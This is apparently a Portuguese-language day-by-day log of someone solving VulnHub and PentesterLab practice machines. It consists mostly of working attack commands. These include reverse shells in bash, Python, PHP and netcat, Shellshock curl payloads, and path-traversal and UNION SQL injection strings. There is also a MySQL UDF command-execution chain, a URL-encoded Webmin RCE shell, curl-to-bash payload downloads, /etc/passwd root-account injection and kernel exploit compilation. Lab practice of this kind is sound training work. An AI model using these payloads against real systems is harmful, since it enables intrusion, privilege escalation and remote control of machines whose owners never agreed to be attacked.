
__--VM--__	<br/>
desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/ <br/>
desafio 2 - https://pentesterlab.com/exercises/s2-052/course	<br/>
desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/	<br/>
desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/	<br/>
desafio 5 - https://www.vulnhub.com/entry/violator-1,153/	<br/>
desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/	<br/>
Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/		<br/>
Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/		<br/>
Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download	<br/>
Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/	<br/>
Desafio 11 - https://vulnhub.com/entry/goldeneye-1,240/	<br/>
Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/	<br/>
Desafio 13 - https://www.vulnhub.com/entry/raven-2,269/		</br>
Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
Desafio 16 - https://www.vulnhub.com/entry/symfonos-31,332/</br>
Desafio 17 - Manual Webmin 1.920 exploit | CVE-2019-15107 | Crontab - https://www.vulnhub.com/entry/nezuko-1,352/ </br>
Desafio 18 - CWE-521 | Tomcat7 bad .jsp | CWE-732 crontab  	  - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
Desafio 19 - Parameter Fuzzing | Password Spray | CVE-2017-16995 - https://www.vulnhub.com/entry/prime-1,358/</br>
Desafio 20 - IDT 'perf_swevent_init' Local Privilege Escalation - https://www.vulnhub.com/entry/sumo-1,480/ </br>
Desafio 21 - Solar Winds Serv-U - CVE-2019-12181 | SQLI into dumpfile - https://www.vulnhub.com/entry/election-1,503/ </br>
Desafio 22 - Fake GoogleBot | LFI | Misconfiguration | $PATH abuse - https://www.vulnhub.com/entry/inclusiveness-1,422/</br>
Desafio 23 - RCE sar2HTML | crontab abuse  - https://www.vulnhub.com/entry/sar-1,425/ </br>
Desafio 24 - PHP LiteAdmin 1.9.3 exploit | sudo tar/zip abuse -  https://www.vulnhub.com/entry/zico2-1,210/</br>
Desafio 25 - Feat V1N1V131R4 | Koken CMS 0.22.24 | Bypass Upload JPG - https://www.vulnhub.com/entry/photographer-1,519/ </br>
Desafio 26 - RCE to DMZ machine | Pivoting with NC | DNS zone transfer | MDNS poisoning - https://www.vulnhub.com/entry/tempus-fugit-1,346/ </br>
Desafio 27 - Buffer Overflow INTRO - https://www.vulnhub.com/entry/covfefe-1,199/ </br>
Desafio 28 - XXE server-side request forgery | BoF Ret2Libc // Buffer Overglow Ret2Libc Exploit development - https://www.vulnhub.com/entry/jigsaw-1,310/</br>
Desafio 29 - Format String Attack | Exploit Development - https://www.vulnhub.com/entry/pegasus-1,109/ </br>
Desafio 30 - Buffer Overflow Exploit Development - https://www.vulnhub.com/entry/brainpan-1,51/</br>
<br/>**--VM--**

<br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
	
	
<h3>Dia 1 - desafio 2(1° desafio)     7/9/2020</h3>

       *scan com nmap        
        *identificação do wordpress -> wpscan -> pesquisar por exploit dos plugins -> wp_google
        *msfconsole -> auxiliary/admin/http/wp_google_maps_sqli
        *quebrar a hash da senha com John 
                john arquivo_com_hash.txt --wordlist=rockyou.txt
        *searchsploit webmin(etapa 1 com nmap - serviço porta 10000)
                *msfconsole -> search webmin
                *use exploit/linux/http/webmin_backdoor  
                *Set ForceExploit true -> versão do exploit é diferente do seviço, força a execução mesmo assim
                *set ssl true -> não sei pq, talvez seja obrigatório "uso do ssl" 
                *find /root
                        cat flag.txt
                *find /home
                        cat /home/webmaster/flag.txt



<h3>Dia 2 - desafio 2(° 2desafio)			8/9/2020</h3>
	
	*Pesquisa sobre “trust” -> vulnerabilidade conhecida -> exploit encontrado: Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution
	
	*varredura da máquina
		nmap -sV
	*execuçaõ do exploit no msfconsole




<h3>Dia 3 			9/9/2020</h3>
	
	*Varredura do alvo
		indetificação vulnerabilidade 
			
	*Invasão do alvo
		exploit unix/webapp/drupal_drupalgeddon2
	
	*Escalaçao de privilégios referência CVE 2015-1328
		msf5 search  CVE-2015-1328
			exploit/linux/local/overlayfs_priv_esc
			
			*Manualmente
			locate linux/local/37292.c
			# gcc -o [arquivo saida]  37292.c    (compilar o arquivo qe está em C )
			
			meterpreter: upload [arquivo saida] /tmp
					OU
			meterpreter: shell
			cd /tmp
			wget 192.168.0.1/[arquivo saida]  ↔ baixar o arquivo de um server local
			
			
			
<h3>Dia 4 			10/9/2020</h3>

	*Varredra da máquina
	
	*ftp://ip_maquina
	
	*nc ip_maquina 21
		site cpfr /home/patrick/version_control

		site cpto /home/ftp/version_control

			descobrir o diretorio path dos dados do server
				-> cat version_control
					/var/www/tryingharderisjoy
		*msfconsole
			use unix/ftp/proftpd_modcopy_exec
					ir para uma shell interativa -> python -c 'import pty;pty.spawn("/bin/sh")'		
			dados em /var/www/tryingharderisjoy/ossec
				cat patricksecretsofjoy
			su patrick
			sudo -l
				/home/patrick/script/test
		*criando script
			echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test

			*entrar no ftp
				ftp ip_maquina
					anonymous
						put arquivo -> upload do arquivo
							put test
		*nc para mover o arquivo
			site cpfr /home/ftp/test
			
			site cpto /home/patrick/script/test

		*executar 
			sudo /home/patrick/script/test			
			



<h3>Dia 5 			11/9/2020</h3>

	*Scan básico
		-sV -Pn  ip_alvo
		
	*criação de world list com dados do link (link na página local)
	
	*nc ip port
		site cpfr /etc/passwd
		site cpto  /var/www/html/passwd
		
			http://192.168.100.8/passwd
			
		*criação lista de users
			mg
			af
			dg
			aw
			
		*hydra pra brute force ftp
			-L userlist.txt -P passlist.txt  192.168.100.8 ftp
			
		* msfconsole unix/ftp/proftpd_modcopy_exec
			entrar shell interativo
				python pty...
			sudo -l
			sudo /home/dg/bd/sbin/proftpd
			
			upar para meterpreter
				session -u sessão
				
				portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1
				
				use exploit/unix/ftp/proftpd_133c_backdoor 
				
				set payload
				


<h3>Dia 6 			12/9/2020</h3>

	*scan
	
	*enumeração diretórios web
		dirb 
		
	
	*(manualemnte) curl
		curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.100.9/administrator/alerts/alertConfigField.php?
		
		curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.100.9/administrator/alerts/alertConfigField.php?

		
	*ssh

<h3>Dia 7 			13/9/2020</h3>

	*scan alvo
	
	*enumerar plugins wp
		WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload
			criar um html
	*criar um shell reverse
		<?php
			exec("/bin/bash -c 'bash -i >& /dev/tcp/my_ip/porta 0 >&1' ");		
		?>

	*nc -lnvp 
	*abrir o arquivo(*criar um html*) no server
	
	*encontrando arqivos suid
		find / -perm -u=s -type f 2>/dev/null
	
	*passwd
		criar um com base do alvo, adicionar user
			pcpc:hash_opensll:0:0:root:/root:/bin/bash   -> igual do root, porém user diferente e com hash senha no lugar do x
				senha default linux -> openssl passwd -1 -salt pcpc batata
				
	*simple server com python
		python -m SimpleHHTPServer 8081
		
	*baixar o novo arquivo passwd do kali
		wget http://ip_kali:8081/passwd
		erro no nome arquivo -> saida de passwd vai para passwd -> wget  -O passwd http://ip_kali:8081/passwd
		
		su pcpc 
			pass -> batata
			root pois está no mesmo grupo
			

<h3>Dia 8 			14/9/2020</h3>

	*scan padrão
	
	*ftp login
		anonymous
			get backp -> baixar o arquivo lá
			
		*quebrar credencial
				john backup
		
		*ssh login
			sudo -l
				sudo /usr/bin/ed   /etc/passwd 
				a -> append

				*adicionar usario ao arquivo
					openssl passwd -1 -salt usuario senha 		
						pcbeco:$1$pcbeco$F6qnmjD.aaKG2d0n2OATa1:0:0:root:/root:/bin/bash

				.
				w /etc/passwd

<h3>Dia 9 			15/9/2020</h3>
	
	*scan
	
	*searchsploit drupal
			34992.py
				explo.py
				drupalpass.py
					explo.py http://192.168.100.11/node?destination=node batman robin
					
	* appearence
		themes
			baixar qualquer um
				template.php
					adcionar codigo malicioso
						exec("/bin/bash -c  'bash -i >& /dev/tcp/192.168.100.x/443 0>&1'");

		*nc -lnvp 433
			python -c 'import pty;pty.spawn("/bin/sh")'
				find / -perm -u=s -file f 2>&-
					/usr/bin/find -exec  "/bin/bash" \;


<h3>Dia 10			16/9/2020</h3>

	*burp suite
	repeater -> index.php?file=about.php
	/var/log/auth.log
		#ssh root@192.168.0.x vai aparecer no log
		#usaremos no lugar do usuario algum script php para ser executado no saida do log
			ssh '?php system($_GET[x]); ?>'@192.168.0.x

			file=/var/log/auth.log&x=ls
			#passa o comando ls como parametro de x

			encodar como html para comandos mais complexos
			 decoder
				ls -lh -> %6c%73%20%2d%6c%68
					 index.php?file=/var/log/auth.log&x=%6c%73%20%2d%6c%68

	*msfvenom -p cmd/unix/reverse_python lhost=192.168.0.x port=443 -f raw
	#saida em linha -> encodar no burp

	*nc -lnvp  443
		python -c 'import pty;pty.spawn("/bin/bash")'	

			*msfvenom -p cmd/unix/reverse_python lhost=192.168.0.x port=443 -f raw > shell_py
				transferir o shell_py para o alvo
					kali -> 	python -m SimpleHTTPServer 8080
					alvo -> wget http://192.168.0.x:8080/shell_py

	sudo /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
		/var/log/auth.log  | shell_py
		
		

<h3>Dia 11 			17/9/2020</h3>

	*scan padrão
		porta 80
			inpecionar página/visualizar origem pagina -> script js -> terminal.js
				password criptografada url
					burp decoder
						InvincibleHack3r
		
	*scan -p-
	pop3 55007
		nc 192.168.0.x 55007
			USER boris
			PASS InvincibleHack3r
				senha errada, user existe

	*hydra -l (user) -P (senhas-wordlist) 192.168.0.x (-s (porta) sem o -s ele roda na porta padrão) pop3 (protocolo)
		password: secret1!
			nc 192.168.0.x 55007
			user boris
			pass secret1!

					pop3
						list -> lista emails
						retr x -> ler email	-> retr 2 -> natalya

			hydra -l  natalya -P (senhas-wordlist) 192.168.0.x -s 55007 pop3 
				pass: bird

			nc 192.168.0.x 55007
			user natalya
			pass bird

			retr 2 
				user: xenia
				pass: RCP90rulez!

				adcionar ao /etc/host 
					192.168.100.14	severnaya-station.com 
						http://severnaya-station.com/gnocertdir/
							user: xenia
							pass: RCP90rulez!
								
				my profile -> messages -> Dr Doak
					 hydra -l  doak -P /usr/share/wordlist/fasttrack.txt 192.168.0.x -s 55007 pop3
					pass: goat
						nc 192.168.0.x 55007
						user doak
						pass goat
							list
							retr x

							user: dr_doak
							pass: 4England!

						logout moodle
						novo login
							user: dr_doak
							pass: 4England!
								my profile -> my private files -> s3cret.txt

						http://severnaya-station.com/dir007key/for-007.jpg
						salvar imagem
				*strings imagem/exiftool imagem

				echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d 

					moodle
					user: admin
					pass: xWinter1995x!

						site administrator -> plugin ->text editor -> tynyMCE html editor 
							Spell engine = PSpellShell
								
						site administrator -> server -> system paths
							path to aspell ->  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 				os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

			editar ip e porta

			nc -lnvp 443

			*moodle
			Home -> My profile -> Blogs -> Add a new entry
				escrever qualquer coisakasdasfosjdjoas
				clicar em Toggle spellchecker -> opção inferior dirito do menu de opções “ABC” para chamar o spell

		uname -a

	kali-> searchsploit linux 3.13
		/usr/share/exploitdb/exploits/linux/local/37292.c

		compilar o arquivo -> gcc -o data 37292.c (compilou 37292.c pra data)

			transferir para a maquina alvo
				python -m SimpleHTTPServer 8080
				m_alvo -> wget ip_kali:8080/37292.c

				chmod +x data -> pra execução
				./data  -> vai dar erro pois n tem o gcc  pra compilar, porém em /usr/bin existe o cc que também serve pra compilar

		editar o 37292.c pois esta referenciando a lib do gcc
			vim datanovo -> linha 143 , tirar o gcc e por cc											

			mandar pro alvo
				compilar -> cc -o datanovo 37292.c
					executar -> ./datanovo
					root :)
						


<h3>Dia 12 			18/9/2020</h3>

	*scan default
	
	*enum4linux
	
	*ip:8080
		http://192.168.100.16:8080/robots.txt	
			/tryharder/tryharder
				*base64
					“password”
				
	*smbclient \\\\192.168.100.16\\qiu -U qiu
		-U -> user -> enum4linux -> qiu
		pass -> password -> ...robots.txt
		
		*ls
			cd .opensesame
			get config -> baixar
				exit
		* Port Knocking Daemon Configuration
		“fazer as requisições na ordem pra executar o comando do firewall e liberar a porta”
			exemplo 1 -> nc 192.168.100.16 159 ; nc 192.168.100.16 27391 ; nc 192.168.100.16 4
			exemplo 2 -> knock 192.168.100.16 159 27391 4 -v
			
				http://192.168.100.16/
					http://192.168.100.16/robots.txt
						http://192.168.100.16/nomercy/
		
			searchsploit rips 0.53
				cat  /usr/share/exploitdb/exploits/php/webapps/18660.txt
					http://192.168.100.16/nomercy/windows/code.php?file=../../../../../../etc/passwd
					*http://192.168.100.16:8080/
						“/etc/tomcat7/tomcat-users.xml”
							http://192.168.100.16/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml
					http://192.168.100.16:8080/
					 	“manager webapp”
							user: - thisisasuperduperlonguser
							pass: - heartbreakisinevitable
							
			*msfvenom -p linux/x86/shell_reverse_tcp lhost=ip_kali lport=443 -f war -o beco.war
				7z l beco.war
					copiar nome **.jsp
						upar arquivo beco.war no tomat -> WAR file to deploy -> Browse -> deploy
							
			*kali -> nc -lnvp 443
			
			*tomcat -> 192.168.100.16:8080/beco/wcsnsdcnkynqv.jsp
			
			*shell
				python -c 'import pty;pty.spawn("/bin/sh")'
				su fluffy
				pass: freakishfluffybunny
				
				cd /home/fluffy
					ls -a
						cd .private
						/home/fluffy/.private/secrets
						cat timeclock
						
			*kali -> msfvenom -p cmd/unix/reverse_netcat lhost=192.168.100.4 lport=4444 -f raw > beco2.sh
				vim beco2.sh
					echo “xxxxxx” >> timeclock
					
					python -c 'import pty;pty.spawn("/bin/sh")'
				
				OBS: cd /home/fluffy/.private/secrets					
				*nc -lnvp 4444
				*shell curl -s http://192.168.100.4:8080/beco2.sh | bash -> vai requisitar o beco2.sh e executar o bash
					cat timeclock
						ultima linha, basta aguardar que a tarerfa será executa e então o comando será executado.(cromtab)
		
		
		

 <h3>Dia 13 			19/9/2020</h3>

	*scan
		nmap -sV -v 
		
	*index
		dirb http://ip -d /usr/share/wordlists/dirb/big.txt
			/vendor
				phpmailer
					searchsploit phpmailer -> 40974.py
						
		*site -> contact
			contact.php
			
			*40974.py
				target: http://ip/contact.php
				backdoor:
				payload:meu_ip  porta
				fiealds: -X/var/www/html/nome_backdor 
				# -*- coding:utf-8 -*-
					python 40974.py
				
		*nc -lnvp porta
		
		*ip/backdoor.php
		
		*shell 
			python -c 'import pty;pty.spawn("/bin/sh")'
			
		*ps aux
			mysql rodando como root

		*/var/www/html/wordpress -> cat wp-config.php
				define('DB_NAME', 'wordpress');

				/** MySQL database username */
				define('DB_USER', 'root');

				/** MySQL database password */
				define('DB_PASSWORD', 'R@v3nSecurity');

		*mysql -u root -p  -> -u usuario, -p pedir senha
		senha: R@v3nSecurity
			
		* gcc -g -c 1518.c
				ls -> 1518.o
				gcc -g -shared -Wl,-soname,becomysql.so -o becomysql.so 1518.o -lc
					ls -l ->becomysql.so
		
		*kali: python -m SimpleHTTPServer 8080			
			*alvo com myqsl: \! sh -> abrir uma shell
				wget http:_ip_:8080/becomysql.so
				exit
		show databases;
		use mysql;
		create table beco(line blob);
		
		insert into beco values(load_file('diretorio/becomysql.so'));
				insert into beco values(load_file('/tmp/becomysql.so'));
				
		select * from beco into dumpfile '/usr/lib/becomysql.so';
		
		 create function do_system returns integer soname 'becomysql.so';
		
		select * from mysql.func;

		*kali -> nc -lnvp 80
		select do_system('nc 192.168.100.4 80 -e /bin/bash ');


<h3>Dia 14 			20/9/2020</h3>
	
	*scan
	
	*dirb (não tem diretorios importante, então procurar arquivos php)
		dirb http://ip -X .php 
			http://192.168.100.18/library.php
			
	*burp
		clique algumas vezes nos paises...até aparecer no burp
			pode ter qualquer país no Germany...
			lastviewed=%7B%22lastviewed%22%3D%3D%22Germany%22%7D
			....video: https://youtu.be/Azl-46OLlVU?t=441
				*repeater -> render
					lastviewed={"lastviewed"=="'Germany'union select user() "} 
						We couldn't find any information for localhost
					lastviewed={"lastviewed"=="'Germany'union select database()"}
						 We couldn't find any information for library
					lastviewed={"lastviewed"=="'Germany'union select table_name from information_schema.tables where table_schema='library' "}
						We couldn't find any information for countries.
					lastviewed={"lastviewed"=="'Germany'union select table_name from information_schema.tables where table_schema='library' and table_name !='countries'"}
						We couldn't find any information for access.
					lastviewed={"lastviewed"=="'Germany'union select column_name from information_schema.columns where table_name='access' "}
						We couldn't find any information for password.
					lastviewed={"lastviewed"=="'Germany'union select column_name from information_schema.columns where table_name='access' and column_name !='password'"}
						We couldn't find any information for username.
					lastviewed={"lastviewed"=="'Germany'union select username from access"}
						We couldn't find any information for globus.
					lastviewed={"lastviewed"=="'Germany'union select password from access"}	
						We couldn't find any information for AroundTheWorld.
						
				*ftp ip
					name:globus
					pass:AroundTheWorld 
					
						*help/?
							pode executar o chmod e o put
							
							http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
							*mandar uma reverse shell e dar chmod 777 nele
								put reserve_shell
								chmod 777 reverse_shell
								
								handler ou nc
									http:ip/reverse_shell  OU	 curl http:ip/reverse_shell
									
									python pty
										cat library.php
									su root
										password
								
							-------------------------
							reverse_shell -> <!php exec("nc 192.168.100.4 443 -e /bin/bash"); !>


<h3>Dia 15 			21/9/2020</h3>

	*scan
		smbd...
	
	*enum4linux ip
		smbclient //192.168.100.19/anonymous
			get backups/logs.txt
				User                            aeolus
				Group                          aeolus
	
	*hydra -> o serviço ssh está com segurança(banindo), tentaremos o ftp				
		hydra -l aeolus -P rockyou.txt 192.168.100.19 ftp
					-l (nome_específico_usurário) -L(lista_user)
					-p(senha_específica)              -P(wordlist)
					
					
	*ssh
		ssh aeolus@192.168.100.19
			password: sergioteamo
			
	*LinEnum
		https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
		
			#apenas copie o linenum.sh e cole no kali
			
			kali: python -m SimpleHTTPServer 8080
			ssh_alvo: curl -s http://192.168.100.4:8080/arquivo_linenum.sh | bash
													ip_kali
													
			[-] Listening TCP:
				LISTEN     0      128    127.0.0.1:8080 
					acesso negado, apenas o host pode acessar


	* pivoting shh
	#ssh -L <local_port>:<remote_host>:<remote_port> <username>@<ip_compromised>
		ssh	-L 8081:localhost:8080 aeolus@192.168.100.19
			
	*navegador_kali
		localhost:8081
		
		user: aeolus
		password: sergioteamo
		
			#searchsploit librenms
			#searchsploit -m 47044.py
			#cat 47044.py
	*burp
		capturar o cookie da seção
		caso não consiga capturar:
			Iniciar o navegador pelo burp -> Intercept is on, Open Browser
			caso de erro, execute: ind .BurpSuite -name chrome-sandbox -exec chown root:root {} \; -exec chmod 4755 {} \;
					\ tente executar o burp sem ser root
		
	*nc -lnvp 443
	python 47044.py http://localhost:8081 'cookie(PHPSESSID=...)' 192.168.100.4 443
		
		#problemas na execução:
			(precisa estar conectado a internet) -> instalar o pip 
					curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
					python get-pip.py
					
				pip install requests 
					    nome do pacote que não foi encontrado, no meu caso foi o requests
	
		python -c 'import pty;pty.spawn("/bin/sh")'
		sudo -l
		sudo /usr/bin/mysql
			\! sh


<h3>Dia 16 			22/9/2020</h3>

	*instalar o go -> https://www.edivaldobrito.com.br/linguagem-go-no-linux/
	*instalar o pspy -> https://vk9-sec.com/how-to-enumerate-services-in-use-with-pspy/
			# apt install golangapt -> apt install golang
			
	*scan default
	
	*dirb http://ip 
		#cgi-bin
		browser:ver código fonte/view-source:ip
			view-source:http://192.168.100.21/
			#Can you bust the underworld#
				http://ip/cgi-bin/underworld
		
	*nc -lnvp 443
		* curl -H "User-Agent: () { :; }; echo; /bin/bash -c ‘nc ip_kali 443 -e /bin/bash’" http://ip_alvo/cgi-bin/underworld
			*na seção do nc:  python -c 'import pty;pty.spawn("/bin/bash")'
	
	*executar o LinEnum
		kali-> pyhton -m SimpleHTTPServer 8080
		alvo-> curl -s http://ip_kali:8080/arquivo_LinEnum | bash
		
	*tcpdump -v -i lo port 21 
		user: hades
		pass:  PTpZTfU4vxgzvRBE
		
	*ssh hades@ip_alvo
		pass:  PTpZTfU4vxgzvRBE
	
	*scp arquivo hades@192.168.100.21:/tmp
	
	* cd /opt/ftpclient
			cat ftpclient.py
				#import ftplib

	*find / -writable -type d 2>&-
		/usr/lib/python2.7
		cd /usr/lib/python2.7
		ls tfp*

		rm ftplib.py
		nano ftplib.py
			import socket,subprocess,os
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(("10.0.0.4",443))      -> ip_kali e porta
			os.dup2(s.fileno(),0)
			os.dup2(s.fileno(),1)
			os.dup2(s.fileno(),2)
			p=subprocess.call(["/bin/sh","-i"]);
				
		*nc -lnvp 443 	-> aguardar a conexão


<h3>Dia 17 			23/9/2020</h3>
	
	*scan -sV -p-
		13337 -> webmin
			https://10.0.0.7:13337/
				#aceitar risco e continuar 
				
	*searsploit webmin
		searchsploit -m 47293.sh
		#cat 47293.sh
		
		#ifconfig																
		curl -ks https://10.0.0.7:13337/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id| ifconfig &new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer:  https://10.0.0.7:13337/session_login.cgi''
	
	*burp
		https://10.0.0.7:13337/password_change.cgi
		
		
			POST /password_change.cgi HTTP/1.1 -> apenas alterar o metodo de GET para POST caso esteja
		adicionar o 
			user=wheel&pam=&expired=2&old=id| ifconfig &new1=wheel&new2=wheel 
		no final
		
		#send modo render
		
		#nc -lnvp 443
		#encodar uma shell em url e por no lugar do ifconfig
			user=wheel&pam=&expired=2&old=id|			%70%65%72%6c%20%2d%65%20%27%75%73%65%20%53%6f%63%6b%65%74%3b%24%69%3d%22%31%30%2e%30%2e%30%2e%34%22%3b%24%70%3d%34%34%33%3b%73%6f%63%6b%65%74%28%53%2c%50%46%5f%49%4e%45%54%2c%53%4f%43%4b%5f%53%54%52%45%41%4d%2c%67%65%74%70%72%6f%74%6f%62%79%6e%61%6d%65%28%22%74%63%70%22%29%29%3b%69%66%28%63%6f%6e%6e%65%63%74%28%53%2c%73%6f%63%6b%61%64%64%72%5f%69%6e%28%24%70%2c%69%6e%65%74%5f%61%74%6f%6e%28%24%69%29%29%29%29%7b%6f%70%65%6e%28%53%54%44%49%4e%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%4f%55%54%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%45%52%52%2c%22%3e%26%53%22%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%22%29%3b%7d%3b%27 &new1=wheel&new2=wheel
			
		*python -c 'import pty;pty.spawn("/bin/bash")'
			
		*pspy
			kali: pythom -m SimpleHTTPServer 8080
			nc: wget http://10.0.0.4:8081/pspy-master

			chmod +x pspy-master
			./pspy-master
			
				#/usr/sbin/CRON -f 
				#send_message_to_nezuko.sh


			
		*nc
			cd /home/zenitsu/to_nezuko	
			cat send_message_to_nezuko.sh
			
			#cat /etc/passwd
				hash do nezujo -> copiar para um arquivo -> john arquivo_com_hash
				zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:/home/zenitsu:/bin/bash

	password:  meowmeow
			
			#su zenitsu
			pass: meowmeow
			
			#nc -lnvp 80			
			#echo “nc 10.0.0.4 80 -e /bin/bash” >> send_message_to_nezuko.sh
			
			Basta esperar pois como visto no pspy, a x tempo é executado um comando relacionado ao send_message_to_nezuko.sh, então adicionando o nc 10.0.0.4 80 -e /bin/bash, em algum momento ele irá se conectar ao kali pelo nc


<h3>Dia 18 			24/9/2020</h3>

	*Scan
		-sV -p-
		
	*ip:8080
		#manager webapp
		user: default ->  tomcat
		password: default ->  tomcat
		
	*msfvenom
		msfvenom -p linux/x86/shell_reverse_tcp lhost=ip_kali lport=443 -f war -o beco.war
	
	7z -l beco.war
		copiar o nome do arquivo *.jsp
			exemplo: quoehctpngtojxo.jsp
			
		*upload no tomcat
			server status -> list applications -> desce: War file to deploy
			
		*nc -lnvp 443
		
		*http://192.168.100.24:8080/beco/quoehctpngtojxo.jsp
		
		*pspy
			kali: python -m SimpleHTTPServer 8081
			wget 192.168.100.4:8081/pspy-master
			chmod +x pspy-master
			./pspy-master
				#CRON
					/tab/script.sh
			
		*msfvenom -p cmd/linux/reverse_netcat lhost=192.168.100.4 lport=444 -f raw
		
		*nc -lnvp 444
		
		*echo 'mkfifo /tmp/kncu; nc 192.168.100.4 444 0</tmp/kncu | /bin/sh >/tmp/kncu 2>&1; rm /tmp/kncu' >> script.sh



<h3>Dia 19 			25/9/2020</h3>

	*scan
	
	*dirb htt://ip_vm
		dirb htt://ip_vm -X .php
		dirb htt://ip_vm -X .txt
			htt://ip/secret.txt
			#location.txt
		
	*wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc 404 --hl 7 --hw 500 http://ip/index.php?FUZZ=location.txt
					-c : Output with colors
						-w: wordlist
							--hc: ignorar o erro 404 
								--hl: mostrar a partir do tamanho 7
									--hw: palavras/segundo ?
									
		#	 http://ip/index.php?file=location.txt
					http://192.168.100.25/index.php?file=location.txt
		
		# http://192.168.100.25/image.php?secrettier360=
		
		
	*burp
		-> repeater
		http://192.168.100.25/image.php?secrettier360=
		http://192.168.100.25/image.php?secrettier360=../../../../../../../../../etc/passwd
			#find password.txt...
		http://192.168.100.25/image.php?secrettier360=../../../../../../../../../home/saket/password.txt
			#follow_the_ippsec
			
		*	http://192.168.100.25/wordpress/wp-admin
			#atack brute user
				password: follow_the_ippsec
				
				
	*hydra -L /usr/share/wordlists/rockyou.txt -p follow_the_ippsec 192.168.100.25 -V http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
	
		Login no wordpress		
		#victor
		#follow_the_ippsec
				
				
		#msfvenom -p cmd/unix/reverse_netcat lport=443 lhost=192.168.100.4 -f raw    -> colar na próxima etapa <?php   xxxxxxx   ?>
		#nc -lnvp 443
	
	*Apparece -> theme editor -> ‘encontrar algum que de pra editar(salvar)’ ->secret.php
	
	<?php
				exec("mkfifo /tmp/cigksp; nc 192.168.100.4 443 0</tmp/cigksp | /bin/sh >/tmp/cigksp 2>&1; rm /tmp/cigksp");
	?>
	
	* ver a página de origem
		-> procurar o content do tema: http://192.168.100.25/wordpress/wp-content/themes/twentynineteen/print.css?ver=1.4
		
		#http://192.168.100.25/wordpress/wp-content/themes/twentynineteen/secret.php
		
	*nc
	uname -a
		#ubuntu 16.04.2
		
	*kali: searchsploit -m 45010
	gcc 45010.c -o beco19
	python3 -m http.server
	
	*nc
		wget http://ip_kali:8000/beco19
		chmod +x beco19
		./beco19





<h3>Dia 20 			26/9/2020</h3>



	*scan
	
	*dirb
		/cgi-bin	/test
		
	*curl -H "User-Agent: () { :; }; echo; /bin/ls" http://192.168.100.26/cgi-bin/test -v
	
	*msfvenom -p cmd/unix/reverse_netcat lhost=192.168.100.22 lport=443 -f raw
		#nc -lnvp 443
		
	*curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'mkfifo /tmp/vufcuun; nc 192.168.100.22 443 0</tmp/vufcuun | /bin/sh >/tmp/vufcuun 2>&1; rm /tmp/vufcuun'" http://192.168.100.26/cgi-bin/test -v
	
	*nc
		uname -a 
			#searchsploit ubuntu 3.2
		
		#kali: searchsploit -m 33589.c
			gcc 33589.c -o beco20
			
			python3 -m http.server
			
			vm: wget http://192.168.100.22:8000/beco20
				chmod +beco20
				./beco20
				#ERRO -> passar argumento -> supported targets -> cat 33589.c
				./beco20 0
					
				#root


<h3>Dia 21 			27/9/2020</h3>

	*scan default
	
	*ip/robots.txt
		#ip/election
		
		searchsploit election
			#searchsploit -m 48122		
			cat 48122
			
	*dirb  http://ip/election -X .php
		
		#card.php
			#decode binary
				#decode binary
		
		user: 1234
		pass: Zxc123!@#
	
	http://ip/election/admin
		
	*Burp suite
		#election
		 	-candidates
				-love -> editar   (capturar essa requisição)
					
					
		*repeater					
		exemplo: {"code":"200","nama":"Love","kelas":"1","fbid":"","bio":"admin1"}
			#SQLI
				aksi=fetch&id=76 order by 5--
					*aksi=fetch&id=76 union select 'T','E','S','T','E'
					
					aksi=fetch&id=1 union select '','','',version(),''--
				
						*ip/phpinfo.php
							raíz: /var/www/html
		
					aksi=fetch&id=1 union select ' ',' ',' ',' ',"<?php system($_GET['a']);?> " into dumpfile '/var/www/html/arquivo.php'--
		
				#Browser
				http://192.168.100.27/arquivo.php?a=cat /etc/passwd
		
		*nc -lnvp 443
		
		*cp /usr/share/webshells/php/php-reverse-shell.php  ./
			nanophp-reverse-shell.php 
				alterar ip e porta
				ip:kali
				porta:443
				
		*python3 http.server
		
		*http://192.168.100.27/arquivo.php?a=wget http://192.168.100.22:8000/php-reverse-shell.php
			http://192.168.100.27/php-reverse-shell.php
			#nc
			
	*nc
